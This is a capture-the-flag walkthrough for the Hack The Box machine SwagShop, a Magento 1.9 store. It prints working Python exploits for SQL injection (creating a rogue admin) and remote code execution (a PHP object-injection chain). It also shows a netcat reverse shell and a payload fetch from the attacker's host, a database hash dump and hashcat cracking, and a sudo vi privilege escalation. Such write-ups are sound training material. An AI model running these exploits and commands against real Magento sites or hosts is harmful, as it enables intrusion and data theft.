# SwagShop - Easy

```sh
sudo vim /etc/hosts
# add swagshop.htb

nmap -T4 -p- -A -Pn -v swagshop.htb
```

* open ports & services:

    * 22/tcp - ssh - OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
    * 80/tcp - http - Apache httpd 2.4.29

* the webpage is for merchandise, and it is based on Magento - an e-commerce platform; the footer mentions '2014 Magento Demo Store'

* web enumeration:

    ```sh
    gobuster dir -u http://swagshop.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md -t 25
    # dir scan

    ffuf -c -u 'http://swagshop.htb' -H 'Host: FUZZ.swagshop.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 0 -s
    # subdomain scan
    ```

* we can explore the webpage content for any clues

* there are options to register and login to an account; there is also a form to check for orders & returns

* ```gobuster``` scan finds a few pages:

    * /media - this lists multiple directories
    * /includes - this has a file 'config.php', but we cannot read it
    * /install.php - this gives an error as Magento is already installed
    * /lib - multiple pages, but mostly PHP files
    * /app - this includes a few XML files related to the install
    * /shell - includes PHP files
    * /LICENSE.txt - no useful info
    * /var - has multiple directories

* checking the XML files in '/app/etc', from 'local.xml' we get the plaintext creds 'root:fMVWh7bDHpgZkyfqQXreTjU9' with DB name 'swagshop' for the MySQL connection

* similarly, checking the XML files in '/var/package' discloses the Magento version 1.9.0.0 from the file naming scheme; the version release timeline matches with the 'last modified' dates of these files

* Googling for exploits related to 'Magento 1.9.0.0' gives results for multiple exploits

* the exploits mention the '/admin' portal, which can be accessed at 'http://swagshop.htb/index.php/admin'

* attempting the creds found earlier for the DB connection does not work here, or in the account login portal

* we can try [this SQLi exploit first](https://www.exploit-db.com/exploits/37977), but it needs to be edited before it works:

    ```sh
    vim 37977.py
    # edit the 'target' attribute and set to 'http://swagshop.htb/index.php'
    
    # the exploit code is in Python2

    python3 -m lib2to3 -w 37977.py
    # convert python2 to python3 code

    python3 37977.py
    # the exploit fails due to a b6encode error - bytes-like object is required

    vim 37977.py
    # convert the 'pfilter' attribute which caused the error, from str to bytes, using encode()

    python3 37977.py
    # the exploit works now
    # we can log into '/admin' using the given creds
    ```

    ```py
    import requests
    import base64
    import sys

    target = "http://swagshop.htb/index.php"

    if not target.startswith("http"):
        target = "http://" + target

    if target.endswith("/"):
        target = target[:-1]

    target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

    q="""
    SET @SALT = 'rp';
    SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
    SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
    INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
    INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
    """


    query = q.replace("\n", "").format(username="forme", password="forme")
    pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query).encode('utf-8')

    # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
    r = requests.post(target_url, 
                    data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                            "filter": base64.b64encode(pfilter),
                            "forwarded": 1})
    if r.ok:
        print("WORKED")
        print("Check {0}/admin with creds forme:forme".format(target))
    else:
        print("DID NOT WORK")
    ```

* the exploit works, and we are able to login into the admin portal at 'http://swagshop.htb/index.php/admin/' using the exploit creds 'forme:forme'

* we can explore the Magento admin panel page now, but we do not find any clues or secrets

* we can now attempt [the second exploit impacting Magento 1.9.0.0, the post-authentication RCE exploit](https://www.exploit-db.com/exploits/37811) - this too needs to be edited:

    ```sh
    vim 37811.py
    # correct the 'username', 'password' and 'install_date' variables
    # as per the exploit notes

    # convert Python2 to Python3 code
    python3 -m lib2to3 -w 37811.py

    python3 37811.py
    # the exploit fails
    # with 'mechanize' giving the error for 'more than one control matching name' for login fields
    ```

* we need to correct the login portion of the exploit and then attempt it once again - the ```mechanize``` portion of the exploit login needs to be corrected, using specific indexing of the form controls

* running the exploit again shows that the ```re.search``` function fails due to the error "cannot use a string pattern on a bytes-like object" - we can correct this by using the ```decode``` function, in those instances, to decode from bytes to str

* similarly, we get errors for concatenation of string and byte data; ```encode``` and ```decode``` functions have to be used for str-to-bytes and bytes-to-str conversion, respectively

* this is the final working exploit code after debugging:

    ```py
    from hashlib import md5
    import sys
    import re
    import base64
    import mechanize


    def usage():
        print("Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\"")
        sys.exit()


    if len(sys.argv) != 3:
        usage()

    # Command-line args
    target = sys.argv[1]
    arg = sys.argv[2]

    # Config.
    username = 'forme'
    password = 'forme'
    php_function = 'system'  # Note: we can only pass 1 argument to the function
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml

    # POP chain to pivot into call_user_exec
    payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
            '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
            'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
            'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
            '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
            ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                        len(arg), arg)
    # Setup the mechanize browser and options
    br = mechanize.Browser()
    #br.set_proxies({"http": "localhost:8080"})
    br.set_handle_robots(False)

    request = br.open(target)

    br.select_form(nr=0)
    form_username = br.find_control('login[username]', nr=0)
    form_password = br.find_control('login[password]', nr=0)
    form_username.value = username
    form_password.value = password

    br.method = "POST"
    request = br.submit()
    content = request.read().decode()
    # print(content)

    url = re.search("ajaxBlockUrl = \'(.*)\'", content)
    url = url.group(1)
    key = re.search("var FORM_KEY = '(.*)'", content)
    key = key.group(1)

    request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
    tunnel = re.search("src=\"(.*)\?ga=", request.read().decode())
    tunnel = tunnel.group(1)

    payload = base64.b64encode(payload.encode('utf-8')).decode()

    gh = md5((payload + install_date).encode('utf-8')).hexdigest()

    exploit = tunnel + '?ga=' + payload + '&h=' + gh

    try:
        request = br.open(exploit)
    except (mechanize.HTTPError, mechanize.URLError) as e:
        print(e.read())
    ```

    ```sh
    vim 37811.py
    # debug the exploit

    python3 37811.py http://swagshop.htb/index.php/admin/ "uname -a"
    # this works
    ```

* we have RCE now - use this to get reverse shell:

    ```sh
    nc -nvlp 4444
    # setup listener

    python3 37811.py http://swagshop.htb/index.php/admin/ "busybox nc 10.10.14.9 4444 -e sh"
    # run the exploit with a reverse-shell one-liner
    ```

* this works and we get reverse shell:

    ```sh
    id
    # www-data

    # stabilise shell
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    export TERM=xterm
    # Ctrl+Z
    stty raw -echo; fg
    # press Enter twice

    pwd
    # /var/www/html

    ls -la
    # enumerate web files

    ls -la /

    ls -la /home
    # only one user

    ls -la /home/haris

    cat /home/haris/user.txt
    # user flag
    ```

* as we have the MySQL creds from earlier, we can check the DB for any hashes:

    ```sh
    mysql -u root -pfMVWh7bDHpgZkyfqQXreTjU9 -D 'swagshop' -e "show tables;"
    # this gives multiple tables

    # we can check the 'admin_user' table

    mysql -u root -pfMVWh7bDHpgZkyfqQXreTjU9 -D 'swagshop' -e "select * from admin_user;"
    # this dumps hashes
    ```

* from the 'admin_user' table, we get the hash for user 'haris@htbswag.net' - '8512c803ecf70d315b7a43a1c8918522:lBHk0AOG0ux8Ac4tcM1sSb1iD5BNnRJp'

* Googling the hash format for Magento 1 shows that it uses a salted MD5 hash format, in the format MD5(salt.pass)

* ```hashcat``` mode 20 translates to ```md5($salt.$pass)``` - we can try it on the 'forme' user and it works:

    ```sh
    vim harishash
    # paste the complete hash

    hashcat -a 0 -m 20 harishash /usr/share/wordlists/rockyou.txt
    # this does not crack the hash

    # we can try with best64 rule
    hashcat -a 0 -m 20 harishash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
    # this also fails
    ```

* ```hashcat``` fails to crack the hash for 'haris' user, so we need to continue our enumeration - we can use ```linpeas```:

    ```sh
    cd /tmp

    # fetch script from attacker
    wget http://10.10.14.9:8000/linpeas.sh

    chmod +x linpeas.sh

    ./linpeas.sh
    ```

* findings from ```linpeas```:

    * Linux version 4.15.0-213-generic, Ubuntu 18.04.6
    * sudo version 1.8.21p2
    * ```sudo -l``` has entries

* ```sudo -l``` shows that the user 'www-data' can run the following as root without password - ```(root) NOPASSWD: /usr/bin/vi /var/www/html/*```

* we can use the [GTFObins exploit for vi](https://gtfobins.org/gtfobins/vi/) and exploit this to read the root flag:

    ```sh
    ls -la /var/www/html
    # we can use any file for this

    sudo /usr/bin/vi /var/www/html/../../../root/root.txt
    # read root flag
    ```
